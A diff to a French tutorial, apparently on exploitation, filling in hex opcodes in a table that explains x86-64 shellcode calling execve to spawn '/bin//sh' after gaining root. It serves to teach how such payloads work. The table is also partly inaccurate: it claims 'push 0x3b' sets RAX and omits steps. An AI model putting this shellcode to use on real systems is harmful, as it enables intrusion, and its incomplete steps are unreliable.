@@ -31,9 +31,9 @@ Une fois devenu Root, vous devez invoquer le terminal.
 
 | Instruction ASM | Opcode (Hex) | Signification                                   |
 | :-------------- | :----------- | :---------------------------------------------- |
-| `xor rsi, rsi`  | ...          | Nettoie RSI (pas d'arguments).                  |
-| `push rsi`      | ...          | Fin de chaîne (NULL byte).                      |
-| `mov rdi, ...`  | ...          | Place "/bin//sh" dans RDI.                      |
+| `xor rsi, rsi`  | `48 31 f6`   | Nettoie RSI (pas d'arguments).                  |
+| `push rsi`      | `56`         | Fin de chaîne (NULL byte).                      |
+| `mov rdi, ...`  | `48 bf`      | Place "/bin//sh" dans RDI.                      |
 | `push 0x3b`     | `6a 3b`      | Place 59 dans RAX (Numéro du syscall `execve`). |
 | `syscall`       | `0f 05`      | Exécute `/bin/sh`.                              |
 
